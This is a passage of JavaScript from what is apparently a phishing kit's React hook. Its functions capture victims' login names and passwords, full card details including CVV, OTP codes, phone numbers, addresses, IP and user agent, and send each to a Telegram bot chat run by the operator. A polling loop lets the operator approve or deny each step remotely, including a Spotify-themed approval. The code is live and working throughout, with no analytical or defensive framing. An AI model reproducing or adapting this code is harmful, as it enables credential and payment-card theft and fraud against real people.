        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Confirmation log sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending confirmation log:', error);
      return false;
    }
  };

  const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
    if (!shouldSendLog('formattedCard')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>🔐 LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginName}
└ 🔑 <b>Password:</b> ${loginPassword}
━━━━━━━━━━━━━━━━━━━━━
<b>💳 CARD DETAILS:</b>
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
<b>📍 PERSONAL INFO:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
<b>🖥️ TECHNICAL INFO:</b>
├ 🌐 <b>Country:</b> Germany
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Formatted card details sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending formatted card details:', error);
      return false;
    }
  };

  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpCode')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const otpMessage = `
🔐 <b>OTP CODE RECEIVED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>OTP Code:</b> <code>${otpCode}</code>
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: otpMessage,
        parse_mode: 'HTML'
      });
      return true;
    } catch (error) {
      console.error('Error sending OTP to Telegram:', error);
      return false;
    }
  };

  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    if (!shouldSendLog('success')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const successMessage = `
✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
<b>Status:</b> OTP Verified ✓
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: successMessage,
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Error sending success message:', error);
    }
  };

  // ========== POLLING ==========
  const setupTelegramPolling = useCallback(() => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    pollingIntervalRef.current = setInterval(async () => {
      const currentSessionId = sessionId || sessionStorage.getItem('telegramSessionId');
      
      if (!currentSessionId) return;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
        const response = await axios.get(url);
        
        const updates = response.data.result;
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            
            const lastUnderscore = callbackData.lastIndexOf('_');
            const action = callbackData.substring(0, lastUnderscore);
            const sid = callbackData.substring(lastUnderscore + 1);

            // ✅ Get stored session and compare only the last 6 chars
            const storedSid = sessionStorage.getItem('telegramSessionId');
            const activeSid = currentSessionId || storedSid;

            console.log('📩 Callback received:', { action, sid, activeSid });

            // ✅ Match by tail — if either is null, still fire
            const match = !activeSid || sid.slice(-6) === activeSid.slice(-6);

            if (match) {
              if (action === 'approve') onApprove?.();
              else if (action === 'deny') onDeny?.();
              else if (action === 'card') onViewCard?.();
              else if (action === 'next') onNextStep?.();
              else if (action === 'back_to_card') onBackToCard?.();
              else if (action === 'back_to_login') onBackToLogin?.();
              else if (action === 'block') onBlock?.();
              else if (action === 'appr') onNextStepAppr?.();
              else if (action === 'back_to_appr') onBackToAppr?.();
              else if (action === 'otp_false') onOtpFalse?.();
              else if (action === 'approve_otp') onApproveOtp?.();
              else if (action === 'card_false') onCardFalse?.();
              else if (action === 'approve_login') onApproveLogin?.();
              else if (action === 'otp_login') onOtpLogin?.();
              else if (action === 'login_false') onLoginFalse?.();
              else if (action === 'card_verification') onCardVerification?.();
              else if (action === 'spotify_appr') onSpotifyAppr?.();
            }

            try {
              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: update.callback_query.id,
                text: "✅ Request processed!"
              });
            } catch (err) {
              console.error('answerCallbackQuery error:', err);
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification]);

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [setupTelegramPolling]);

  return {
    generateSessionId,
    sendLoginRequestToTelegram,
    sendCheckoutEmailToTelegram,     // ← NEW
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendPageViewLog,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendOtpTypingLog,
    sendSiteEntryLog,
    sendVisitNotification,
    sendConfirmationLog,
    sendConfirmationPageLog,
  };
};